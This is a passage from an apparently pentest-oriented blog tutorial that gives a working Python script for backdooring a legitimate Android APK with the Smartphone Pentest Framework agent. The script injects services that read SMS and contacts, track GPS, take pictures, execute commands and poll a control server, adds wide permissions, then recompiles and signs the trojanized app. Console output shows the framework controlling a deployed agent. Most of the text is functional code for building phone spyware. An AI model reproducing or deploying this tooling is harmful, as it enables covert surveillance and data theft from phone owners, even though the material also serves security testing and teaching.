        &lt;service android:name="com.bulbsecurity.framework.ContactsGet"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.InternetPoller"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.WebUploadService"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.PictureService"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.Download"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.Execute"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.GetGPS"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.Checkin"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.Listener"&gt;&lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.Phase1" android:process=":three"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.Phase2" android:process=":two"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.Exynos"&gt;&lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.Upload"&gt;&lt;/service&gt;
        &lt;activity android:name="com.bulbsecurity.framework.AndroidAgentActivity"&gt;
        &lt;intent-filter&gt;
        &lt;action android:name="android.intent.action.MAIN" /&gt;
        &lt;category android:name="android.intent.category.LAUNCHER" /&gt;
        &lt;/intent-filter&gt;
        &lt;/activity&gt;
"""</span>
<span>with</span> <span>open</span><span>(</span>manifestfile<span>,</span> <span>'r'</span><span>)</span> <span>as</span> f:
      fc <span>=</span> f.<span>read</span><span>(</span><span>)</span>
<span>with</span> <span>open</span><span>(</span>manifestfile<span>,</span> <span>'w'</span><span>)</span> <span>as</span> f:
      f.<span>write</span><span>(</span><span>re</span>.<span>sub</span><span>(</span>r<span>'(&lt;<span>\/</span>application&gt;)'</span><span>,</span> r<span>'%s<span>\1</span>'</span>%inject<span>,</span> fc<span>,</span> count<span>=</span><span>1</span><span>)</span><span>)</span>
inject <span>=</span> <span>"""
        &lt;uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" /&gt;
        &lt;uses-permission android:name="android.permission.INTERNET" /&gt;
        &lt;uses-permission android:name="android.permission.RECEIVE_SMS"/&gt;
        &lt;uses-permission android:name="android.permission.SEND_SMS"/&gt;
        &lt;uses-permission android:name="android.permission.CAMERA"/&gt;
        &lt;uses-permission android:name="android.permission.READ_CONTACTS"/&gt;
        &lt;uses-permission android:name="android.permission.INTERNET"/&gt;
        &lt;uses-permission android:name="android.permission.READ_SMS"/&gt;
        &lt;uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/&gt;
        &lt;uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/&gt;
        &lt;uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/&gt;
        &lt;uses-permission android:name="android.permission.READ_PHONE_STATE"/&gt;
        &lt;uses-permission android:name="android.permission.ACCESS_WIFI_STATE" /&gt;
        &lt;uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" /&gt;
"""</span>
<span>with</span> <span>open</span><span>(</span>manifestfile<span>,</span> <span>'r'</span><span>)</span> <span>as</span> f:
     fc <span>=</span> f.<span>read</span><span>(</span><span>)</span>
<span>with</span> <span>open</span><span>(</span>manifestfile<span>,</span> <span>'w'</span><span>)</span> <span>as</span> f:
     f.<span>write</span><span>(</span><span>re</span>.<span>sub</span><span>(</span>r<span>'(&lt;uses-permission)'</span><span>,</span> r<span>'%s<span>\1</span>'</span>%inject<span>,</span> fc<span>,</span> count<span>=</span><span>1</span><span>)</span><span>)</span>
stringfile <span>=</span> foldername + <span>"/res/values/strings.xml"</span> 
inject <span>=</span> <span>"""
        &lt;string name="key"&gt;KEYKEY1&lt;/string&gt;
        &lt;string name="controlnumber"&gt;155552155554&lt;/string&gt;
        &lt;string name="controlIP"&gt;192.168.1.108&lt;/string&gt;
        &lt;string name="urii"&gt;/control&lt;/string&gt;
        &lt;string name="controlpath"&gt;/androidagent1&lt;/string&gt;
"""</span>
<span>if</span> <span>os</span>.<span>path</span>.<span>exists</span><span>(</span>stringfile<span>)</span>:
      <span>with</span> <span>open</span><span>(</span>stringfile<span>,</span> <span>'r'</span><span>)</span> <span>as</span> f:
           fc <span>=</span> f.<span>read</span><span>(</span><span>)</span>
      <span>with</span> <span>open</span><span>(</span>stringfile<span>,</span> <span>'w'</span><span>)</span> <span>as</span> f:
           f.<span>write</span><span>(</span><span>re</span>.<span>sub</span><span>(</span>r<span>'(&lt;<span>\/</span>resources&gt;)'</span><span>,</span> r<span>'%s<span>\1</span>'</span>%inject<span>,</span> fc<span>,</span> count<span>=</span><span>1</span><span>)</span><span>)</span>
<span>else</span>:
     inject2 <span>=</span> <span>"""
       &lt;?xml version="1.0" encoding="utf-8"?&gt;
       &lt;resources&gt;
     """</span>
     <span>os</span>.<span>system</span><span>(</span><span>"touch "</span> + stringfile<span>)</span>
     <span>with</span> <span>open</span><span>(</span>stringfile<span>,</span> <span>'w'</span><span>)</span> <span>as</span> f:
          f.<span>write</span><span>(</span>inject2<span>)</span>  
          f.<span>write</span><span>(</span>inject<span>)</span>
	  f.<span>write</span><span>(</span><span>"&lt;/resources&gt;"</span><span>)</span>
controlphone <span>=</span> <span>raw_input</span><span>(</span><span>'Phone number of the control modem for the agent: '</span><span>)</span>.<span>strip</span><span>(</span><span>)</span>
controlkey <span>=</span> <span>raw_input</span><span>(</span><span>'Control key for the agent: '</span><span>)</span>.<span>strip</span><span>(</span><span>)</span>
controlpath <span>=</span> <span>raw_input</span><span>(</span><span>'Webserver control path for agent: '</span><span>)</span>.<span>strip</span><span>(</span><span>)</span>
controlip <span>=</span> <span>raw_input</span><span>(</span><span>'Webserver control IP: '</span><span>)</span>.<span>strip</span><span>(</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"sed -i <span>\'</span>s/&lt;string name=<span>\"</span>key<span>\"</span>&gt;.*/&lt;string name=<span>\"</span>key<span>\"</span>&gt;"</span> + controlkey + <span>"&lt;<span>\\</span>/string&gt;/' "</span> + stringfile<span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"sed -i <span>\'</span>s/&lt;string name=<span>\"</span>controlnumber<span>\"</span>&gt;.*/&lt;string name=<span>\"</span>controlnumber<span>\"</span>&gt;"</span> + controlphone + <span>"&lt;<span>\\</span>/string&gt;/' "</span> + stringfile<span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"sed -i <span>\'</span>s/&lt;string name=<span>\"</span>controlIP<span>\"</span>&gt;.*/&lt;string name=<span>\"</span>controlIP<span>\"</span>&gt;"</span> + controlip + <span>"&lt;<span>\\</span>/string&gt;/' "</span> + stringfile<span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"sed -i <span>\'</span>s/&lt;string name=<span>\"</span>controlip<span>\"</span>&gt;.*/&lt;string name=<span>\c</span>ontrolip<span>\"</span>&gt;"</span> + controlip + <span>"&lt;<span>\\</span>/string&gt;/' "</span> + stringfile<span>)</span> 
xml_path <span>=</span> foldername + <span>'/res/values/styles.xml'</span>
<span>if</span> <span>os</span>.<span>path</span>.<span>exists</span><span>(</span>xml_path<span>)</span>:
     tree <span>=</span> ET.<span>parse</span><span>(</span>xml_path<span>)</span>
     <span>for</span> child <span>in</span> tree.<span>findall</span><span>(</span><span>'.//*[@parent]'</span><span>)</span>:
          <span>if</span> child.<span>get</span><span>(</span><span>'parent'</span><span>)</span>.<span>startswith</span><span>(</span><span>'@*android:style/'</span><span>)</span>:
               new_parent <span>=</span> child.<span>get</span><span>(</span><span>'parent'</span><span>)</span>.<span>replace</span><span>(</span><span>'@*android:style/'</span><span>,</span><span>'@android:style/'</span><span>)</span>
               child.<span>set</span><span>(</span><span>'parent'</span><span>,</span> new_parent<span>)</span>
     tree.<span>write</span><span>(</span>xml_path<span>)</span>
<span>os</span>.<span>system</span><span>(</span>apktoolloc + <span>" b "</span> + foldername + <span>" "</span> + foldername + <span>".apk"</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"rm -rf "</span> + foldername<span>)</span> 
<span>os</span>.<span>system</span><span>(</span>apktoolloc + <span>" d "</span> + foldername + <span>".apk "</span> + foldername + <span>"/"</span><span>)</span></pre></td></tr></table></div>

<h2>Remapping the Resources</h2>
<p>Now run the script up to here.  Take a look inside the new decompiled MapsDemo. Look in res/values and view public.xml. Take note of the hexadecimal values for the strings we added previously.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="xml">   <span><span>&lt;public</span> <span>type</span>=<span>"string"</span> <span>name</span>=<span>"key"</span> <span>id</span>=<span>"0x7f050001"</span> <span>/&gt;</span></span>
    <span><span>&lt;public</span> <span>type</span>=<span>"string"</span> <span>name</span>=<span>"controlnumber"</span> <span>id</span>=<span>"0x7f050002"</span> <span>/&gt;</span></span>
    <span><span>&lt;public</span> <span>type</span>=<span>"string"</span> <span>name</span>=<span>"controlIP"</span> <span>id</span>=<span>"0x7f050003"</span> <span>/&gt;</span></span>
    <span><span>&lt;public</span> <span>type</span>=<span>"string"</span> <span>name</span>=<span>"urii"</span> <span>id</span>=<span>"0x7f050004"</span> <span>/&gt;</span></span>
    <span><span>&lt;public</span> <span>type</span>=<span>"string"</span> <span>name</span>=<span>"controlpath"</span> <span>id</span>=<span>"0x7f050005"</span> <span>/&gt;</span></span></pre></td></tr></table></div>

<p>These resources are mapped incorrectly. For example take a look at the Smali for the Checkin class at MapsDemo/smali/com/bulbsecurity/framework.Checkin.smali and grep for 0x to get hex values<br/>
<code><br/>
root@kali:~/BackdoorExample/MapsDemo/smali/com/bulbsecurity/framework# cat Checkin.smali | grep 0x<br/>
    const/4 v0, 0x0<br/>
    const v15, 0x7f050003<br/>
    const v15, 0x7f050004<br/>
..snip...<br/>
</code><br/>
Now compare this to the source code of the Checkin class in AndroidAgent/src/com/bulbsecurity/framework. The only two calls to the resources in this class are:</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="java"><span>String</span> key <span>=</span> getApplicationContext<span>(</span><span>)</span>.<span>getResources</span><span>(</span><span>)</span>.<span>getString</span><span>(</span>R.<span>string</span>.<span>key</span><span>)</span><span>;</span>
<span>String</span> controlnumber <span>=</span> getApplicationContext<span>(</span><span>)</span>.<span>getResources</span><span>(</span><span>)</span>.<span>getString</span><span>(</span>R.<span>string</span>.<span>controlnumber</span><span>)</span><span>;</span></pre></td></tr></table></div>

<p>Comparing the values for key (0x7f0500001) and controlnumber(0x7f0500002) in public.xml to the values in the Smali code 0x7f0500003 and 0x7f0500004 respectively, you can see that the resources are indeed mapped incorrectly.  Luckily, we can easily fix this. Grab an ET of public.xml and note all the new resource hexadecimal values in variables.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python">tree <span>=</span> ET.<span>ElementTree</span><span>(</span><span>)</span>
tree.<span>parse</span><span>(</span>foldername + <span>"/res/values/public.xml"</span><span>)</span>
root <span>=</span> tree.<span>getroot</span><span>(</span><span>)</span>
<span>for</span> child <span>in</span> root:
     <span>if</span> <span>(</span>child.<span>get</span><span>(</span><span>'name'</span><span>)</span> <span>==</span> <span>"key"</span> <span>)</span>:
          newkeyvalue <span>=</span> child.<span>get</span><span>(</span><span>'id'</span><span>)</span>
     <span>if</span> <span>(</span>child.<span>get</span><span>(</span><span>'name'</span><span>)</span> <span>==</span> <span>"urii"</span> <span>)</span>:
          newuriivalue <span>=</span> child.<span>get</span><span>(</span><span>'id'</span><span>)</span>
     <span>if</span> <span>(</span>child.<span>get</span><span>(</span><span>'name'</span><span>)</span> <span>==</span> <span>"controlIP"</span> <span>)</span>:
          newcontrolIPvalue <span>=</span> child.<span>get</span><span>(</span><span>'id'</span><span>)</span>
     <span>if</span> <span>(</span>child.<span>get</span><span>(</span><span>'name'</span><span>)</span> <span>==</span> <span>"controlnumber"</span> <span>)</span>:
          newcontrolnumbervalue <span>=</span> child.<span>get</span><span>(</span><span>'id'</span><span>)</span>
     <span>if</span> <span>(</span>child.<span>get</span><span>(</span><span>'name'</span><span>)</span> <span>==</span> <span>"controlpath"</span> <span>)</span>:
          newcontrolpathvalue <span>=</span> child.<span>get</span><span>(</span><span>'id'</span><span>)</span></pre></td></tr></table></div>

<p>Luckily for us the old values can be found in the R$.string Smali file at MapsDemo/smali/com/bulbsecurity/framework. Look for the string name and grab field 7 with cut as shown below.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python">oldkeyvalue <span>=</span> <span>os</span>.<span>popen</span><span>(</span><span>'cat '</span> + foldername + <span>'/smali/com/bulbsecurity/framework/R<span>\$</span>string.smali | grep key | cut -d" " -f7'</span><span>)</span>.<span>read</span><span>(</span><span>)</span>.<span>strip</span><span>(</span><span>)</span>
olduriivalue <span>=</span> <span>os</span>.<span>popen</span><span>(</span><span>'cat '</span> + foldername + <span>'/smali/com/bulbsecurity/framework/R<span>\$</span>string.smali | grep urii | cut -d" " -f7'</span><span>)</span>.<span>read</span><span>(</span><span>)</span>.<span>strip</span><span>(</span><span>)</span>
oldcontrolIPvalue <span>=</span> <span>os</span>.<span>popen</span><span>(</span><span>'cat '</span> + foldername + <span>'/smali/com/bulbsecurity/framework/R<span>\$</span>string.smali | grep controlIP | cut -d" " -f7'</span><span>)</span>.<span>read</span><span>(</span><span>)</span>.<span>strip</span><span>(</span><span>)</span>
oldcontrolpathvalue <span>=</span> <span>os</span>.<span>popen</span><span>(</span><span>'cat '</span> + foldername + <span>'/smali/com/bulbsecurity/framework/R<span>\$</span>string.smali | grep controlpath | cut -d" " -f7'</span><span>)</span>.<span>read</span><span>(</span><span>)</span>.<span>strip</span><span>(</span><span>)</span>
oldcontrolnumbervalue <span>=</span> <span>os</span>.<span>popen</span><span>(</span><span>'cat '</span> + foldername + <span>'/smali/com/bulbsecurity/framework/R<span>\$</span>string.smali | grep controlnumber | cut -d" " -f7'</span><span>)</span>.<span>read</span><span>(</span><span>)</span>.<span>strip</span><span>(</span><span>)</span></pre></td></tr></table></div>

<p>Now use os.walk to grab every file in the MapsDemo/smali/com/bulbsecurity/framework directory. Then look through each file and replace any instances of the old value with the new value. This should effectively remap our resources on the fly.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python"><span>for</span> dname<span>,</span> dirs<span>,</span> files <span>in</span> <span>os</span>.<span>walk</span><span>(</span>foldername + <span>"/smali/com/bulbsecurity/framework"</span><span>)</span>:
     <span>for</span> fname <span>in</span> files:
          fpath <span>=</span> <span>os</span>.<span>path</span>.<span>join</span><span>(</span>dname<span>,</span> fname<span>)</span>
               <span>with</span> <span>open</span><span>(</span>fpath<span>)</span> <span>as</span> f:
                    s <span>=</span> f.<span>read</span><span>(</span><span>)</span>
                    s <span>=</span> s.<span>replace</span><span>(</span>oldkeyvalue<span>,</span> newkeyvalue<span>)</span>
                    s <span>=</span> s.<span>replace</span><span>(</span>olduriivalue<span>,</span> newuriivalue<span>)</span>
                    s <span>=</span> s.<span>replace</span><span>(</span>oldcontrolIPvalue<span>,</span> newcontrolIPvalue<span>)</span>
                    s <span>=</span> s.<span>replace</span><span>(</span>oldcontrolpathvalue<span>,</span> newcontrolpathvalue<span>)</span>
                    s <span>=</span> s.<span>replace</span><span>(</span>oldcontrolnumbervalue<span>,</span> newcontrolnumbervalue<span>)</span>
             <span>with</span> <span>open</span><span>(</span>fpath<span>,</span> <span>"w"</span><span>)</span> <span>as</span> f:
                    f.<span>write</span><span>(</span>s<span>)</span></pre></td></tr></table></div>

<p>Don’t forget to add some code to fix the Apktool bug again before recompiling.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python">xml_path <span>=</span> foldername + <span>'/res/values/styles.xml'</span>
<span>if</span> <span>os</span>.<span>path</span>.<span>exists</span><span>(</span>xml_path<span>)</span>:
     tree <span>=</span> ET.<span>parse</span><span>(</span>xml_path<span>)</span>
     <span>for</span> child <span>in</span> tree.<span>findall</span><span>(</span><span>'.//*[@parent]'</span><span>)</span>:
          <span>if</span> child.<span>get</span><span>(</span><span>'parent'</span><span>)</span>.<span>startswith</span><span>(</span><span>'@*android:style/'</span><span>)</span>:
               new_parent <span>=</span> child.<span>get</span><span>(</span><span>'parent'</span><span>)</span>.<span>replace</span><span>(</span><span>'@*android:style/'</span><span>,</span><span>'@android:style/'</span><span>)</span>
               child.<span>set</span><span>(</span><span>'parent'</span><span>,</span> new_parent<span>)</span>
     tree.<span>write</span><span>(</span>xml_path<span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"rm "</span> + foldername + <span>".apk"</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span>apktoolloc + <span>" b "</span> + foldername + <span>" "</span> + foldername + <span>".apk"</span><span>)</span></pre></td></tr></table></div>

<h2>Signing the APK</h2>
<p>The last thing we need to do is sign the backdoored APK. Though Android allows self signed apps, even devices that allow the installation of apps from sources other than Google Play require APKs to be signed. I will do a separate post on signing methods including the infamous Android Master Key vulnerability in the future. For now let’s just sign with the debug key. In Kali Linux this is stored in the /root/.android directory and has a default password of android.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python"><span>os</span>.<span>system</span><span>(</span><span>"jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore /root/.android/debug.keystore "</span> + foldername + <span>".apk "</span> +  <span>"androiddebugkey"</span><span>)</span></pre></td></tr></table></div>

<p>Now you can run the APK on a device or emulator. Since we’ve backdoored our APK with the SPF Agent, if we set the correct parameters we can even hook it up to the SPF console.</p>
<p><code><br/>
Select An Option from the Menu:</code></p>
<p>	 1.)  Attach Framework to a Deployed Agent/Create Agent<br/>
	 2.)  Send Commands to an Agent<br/>
	 3.)  View Information Gathered<br/>
	 4.)  Attach Framework to a Mobile Modem<br/>
	 5.)  Run a remote attack<br/>
	 6.)  Run a social engineering or client side attack<br/>
	 7.)  Clear/Create Database<br/>
	 8.)  Use Metasploit<br/>
	 9.)  Compile code to run on mobile devices<br/>
	10.)  Install Stuff<br/>
	11.)  Use Drozer<br/>
	 0.)  Exit</p>
<p>spf&gt; 1</p>
<p>Select An Option from the Menu:</p>
<p>	1.) Attach Framework to a Deployed Agent<br/>
	2.) Generate Agent App<br/>
	3.) Copy Agent to Web Server<br/>
	4.) Import an Agent Template<br/>
	5.) Backdoor Android APK with Agent<br/>
	6.) Create APK Signing Key<br/>
spf&gt; 1<br/>
Attach to a Deployed Agent:</p>
<p>This will set up handlers to control an agent that has already been deployed.</p>
<p>Agent URL Path: /androidagent1<br/>
Agent Control Key: KEYKEY1<br/>
Communication Method(SMS/HTTP): HTTP</p>
<p>URL Path: /androidagent1<br/>
Control Key: KEYKEY1<br/>
Communication Method: HTTP<br/>
Is this correct?(y/N): y<br/>
mkdir: cannot create directory `/var/www/androidagent1': File exists</p>
<p>- - - </p>
<p>Select An Option from the Menu:</p>
<p>	 1.)  Attach Framework to a Deployed Agent/Create Agent<br/>
	 2.)  Send Commands to an Agent<br/>
	 3.)  View Information Gathered<br/>
	 4.)  Attach Framework to a Mobile Modem<br/>
	 5.)  Run a remote attack<br/>
	 6.)  Run a social engineering or client side attack<br/>
	 7.)  Clear/Create Database<br/>
	 8.)  Use Metasploit<br/>
	 9.)  Compile code to run on mobile devices<br/>
	10.)  Install Stuff<br/>
	11.)  Use Drozer<br/>
	 0.)  Exit</p>
<p>spf&gt; 2</p>
<p>Available Agents:</p>
<p>	1.) +16017502059<br/>
<br/>
More details on this are covered in the SPF Manual <a href="http://www.bulbsecurity.com/smartphone-pentest-framework/spf-user-guide/#SPF_Agents">Agents Section</a>.</p>
<h2>Putting it all together</h2>
<p>Though we looked at a particular backdoor in this post, you can see how this technique could be extended to work with custom backdoors you create including both passive code such as an SMS broadcast receiver and active code that we need to start when the app starts such as the HTTP poller we added here. </p>
<p>The final script code is shown below:</p>

<div class="wp_syntax"><table><tr><td class="line_numbers"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
</pre></td><td class="code"><pre class="python"><span>#!/usr/bin/python </span>
<span>import</span> <span>os</span>
<span>import</span> <span>xml</span>.<span>etree</span>.<span>ElementTree</span> <span>as</span> ET
<span>import</span> <span>re</span>
inputfile <span>=</span> <span>raw_input</span><span>(</span><span>'APK to Backdoor: '</span><span>)</span>.<span>strip</span><span>(</span><span>)</span>
apktoolloc <span>=</span> <span>"/root/Smartphone-Pentest-Framework/apktool-install-linux-r05-ibot/apktool"</span>
<span>os</span>.<span>system</span><span>(</span>apktoolloc + <span>" d "</span> + inputfile<span>)</span>
path<span>,</span><span>file</span> <span>=</span> <span>os</span>.<span>path</span>.<span>split</span><span>(</span>inputfile<span>)</span>
foldername <span>=</span> <span>file</span><span>[</span>:-<span>4</span><span>]</span>
ET.<span>register_namespace</span><span>(</span><span>"android"</span><span>,</span> <span>"http://schemas.android.com/apk/res/android"</span><span>)</span>
tree <span>=</span> ET.<span>ElementTree</span><span>(</span><span>)</span>
tree.<span>parse</span><span>(</span>foldername + <span>"/AndroidManifest.xml"</span><span>)</span>
root <span>=</span> tree.<span>getroot</span><span>(</span><span>)</span>
package <span>=</span> root.<span>get</span><span>(</span><span>'package'</span><span>)</span>
<span>print</span> package
<span>for</span> child <span>in</span> root:
     <span>if</span> child.<span>tag</span> <span>==</span> <span>"application"</span>:
          app <span>=</span> child
          <span>for</span> child <span>in</span> app:
               <span>if</span> child.<span>tag</span> <span>==</span> <span>"activity"</span>:
                    act <span>=</span> child
                    <span>for</span> child <span>in</span> act:
                         <span>if</span> child.<span>tag</span> <span>==</span> <span>"intent-filter"</span>:
                              <span>filter</span> <span>=</span> child
                              <span>for</span> child <span>in</span> <span>filter</span>:  
                                   <span>if</span> <span>(</span><span>filter</span><span>[</span><span>0</span><span>]</span>.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span> <span>==</span> <span>"android.intent.category.LAUNCHER"</span> <span>or</span>  <span>filter</span><span>[</span><span>0</span><span>]</span>.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span> <span>==</span> <span>"android.intent.action.MAIN"</span><span>)</span>:
                                        <span>if</span> <span>(</span><span>filter</span><span>[</span><span>1</span><span>]</span>.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span> <span>==</span> <span>"android.intent.category.LAUNCHER"</span> <span>or</span>  <span>filter</span><span>[</span><span>1</span><span>]</span>.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span> <span>==</span> <span>"android.intent.action.MAIN"</span><span>)</span>:
                                             mainact <span>=</span>  act.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span>
					     <span>if</span> mainact<span>[</span><span>0</span><span>]</span> <span>==</span> <span>"."</span>:
                                                  mainact <span>=</span> package + mainact
                                             <span>print</span> mainact
					     act.<span>remove</span><span>(</span><span>filter</span><span>)</span>
                                             tree.<span>write</span><span>(</span><span>"output.xml"</span><span>)</span>
					     <span>break</span>
<span>os</span>.<span>system</span><span>(</span><span>"mv output.xml "</span> + foldername  + <span>"/AndroidManifest.xml"</span><span>)</span>
mainactsplit <span>=</span> mainact.<span>split</span><span>(</span><span>"."</span><span>)</span>
length <span>=</span> <span>len</span><span>(</span>mainactsplit<span>)</span>
classname <span>=</span> mainactsplit<span>[</span>length - <span>1</span><span>]</span>
<span>print</span> classname
package <span>=</span> mainactsplit<span>[</span><span>0</span><span>]</span> + <span>"."</span>
<span>for</span> x <span>in</span> <span>range</span><span>(</span><span>1</span><span>,</span> <span>(</span>length - <span>2</span><span>)</span><span>)</span>:
     add <span>=</span> mainactsplit<span>[</span>x<span>]</span> + <span>"."</span>
     package +<span>=</span> add
package +<span>=</span> mainactsplit<span>[</span>length - <span>2</span><span>]</span>
<span>print</span> package
appmain <span>=</span> package + <span>"."</span> + classname + <span>".class"</span>
<span>print</span> appmain
mainfile <span>=</span> <span>"AndroidAgent/src/com/bulbsecurity/framework/AndroidAgentActivity.java"</span>
inject <span>=</span> <span>"<span>\n</span>        Intent intent2 = new Intent(getApplicationContext(), "</span> + appmain +  <span>");<span>\n</span>startActivity(intent2);<span>\n</span>"</span>
<span>with</span> <span>open</span><span>(</span>mainfile<span>,</span> <span>'r'</span><span>)</span> <span>as</span> f:
     fc <span>=</span> f.<span>read</span><span>(</span><span>)</span>
<span>with</span> <span>open</span><span>(</span>mainfile<span>,</span> <span>'w'</span><span>)</span> <span>as</span> f:
     f.<span>write</span><span>(</span><span>re</span>.<span>sub</span><span>(</span>r<span>'(finish)'</span><span>,</span> r<span>'%s<span>\1</span>'</span>%inject<span>,</span> fc<span>,</span> count<span>=</span><span>1</span><span>)</span><span>)</span>
newfolder <span>=</span> <span>"src/"</span> + mainactsplit<span>[</span><span>0</span><span>]</span> + <span>"/"</span>
<span>os</span>.<span>system</span><span>(</span><span>"mkdir AndroidAgent/"</span> + newfolder<span>)</span>
<span>for</span> x <span>in</span> <span>range</span><span>(</span><span>1</span><span>,</span> <span>(</span>length - <span>1</span><span>)</span><span>)</span>:
     add <span>=</span> mainactsplit<span>[</span>x<span>]</span> + <span>"/"</span>
     newfolder +<span>=</span> add
     <span>os</span>.<span>system</span><span>(</span><span>"mkdir AndroidAgent/"</span> + newfolder<span>)</span>  
fullclasspath <span>=</span>  <span>"AndroidAgent/"</span> + newfolder + classname + <span>".java"</span>
<span>os</span>.<span>system</span><span>(</span><span>"touch "</span> + fullclasspath<span>)</span>
f <span>=</span> <span>open</span><span>(</span>fullclasspath<span>,</span> <span>'w'</span><span>)</span>
line1 <span>=</span> <span>"package "</span> + package + <span>";<span>\n</span>"</span>
line2 <span>=</span> <span>"import android.app.Activity;<span>\n</span>"</span>
line3 <span>=</span> <span>"public class "</span> + classname + <span>" extends Activity {<span>\n</span>"</span>
line4 <span>=</span> <span>"}<span>\n</span>"</span>
f.<span>write</span><span>(</span>line1<span>)</span>
f.<span>write</span><span>(</span>line2<span>)</span>
f.<span>write</span><span>(</span>line3<span>)</span>
f.<span>write</span><span>(</span>line4<span>)</span>
f.<span>close</span><span>(</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"android update project --name AndroidAgent --path AndroidAgent/"</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"ant -f AndroidAgent/build.xml clean debug"</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span>apktoolloc + <span>" d AndroidAgent/bin/AndroidAgent-debug.apk AndroidAgent2/"</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"mkdir "</span> + foldername + <span>"/smali/com"</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"cp -rf AndroidAgent2/smali/com/bulbsecurity "</span> + foldername + <span>"/smali/com/"</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"mkdir "</span> + foldername + <span>"/smali/jackpal"</span><span>)</span>
<span>os</span>.<span>system</span><span>(</span><span>"cp -rf AndroidAgent2/smali/jackpal "</span> + foldername + <span>"/smali/"</span><span>)</span>
manifestfile <span>=</span> foldername + <span>"/AndroidManifest.xml"</span>
inject <span>=</span> <span>"""
        &lt;receiver android:name="com.bulbsecurity.framework.SMSReceiver"&gt;
        &lt;intent-filter android:priority="999"&gt;&lt;action android:name="android.provider.Telephony.SMS_RECEIVED" /&gt;&lt;/intent-filter&gt;
        &lt;/receiver&gt;
        &lt;service android:name="com.bulbsecurity.framework.SMSService"&gt;
        &lt;/service&gt;
        &lt;receiver android:name="com.bulbsecurity.framework.ServiceAutoStarterr"&gt;
        &lt;intent-filter &gt;&lt;action android:name="android.intent.action.BOOT_COMPLETED"&gt;&lt;/action&gt;&lt;/intent-filter&gt;
        &lt;/receiver&gt;
        &lt;receiver android:name="com.bulbsecurity.framework.AlarmReceiver" android:process=":remote"&gt;&lt;/receiver&gt;
        &lt;service android:name="com.bulbsecurity.framework.CommandHandler"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.PingSweep"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.SMSGet"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.ContactsGet"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.InternetPoller"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.WebUploadService"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.PictureService"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.Download"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.Execute"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.GetGPS"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.Checkin"&gt;
        &lt;/service&gt;
        &lt;service android:name="com.bulbsecurity.framework.Listener"&gt;&lt;/service&gt;
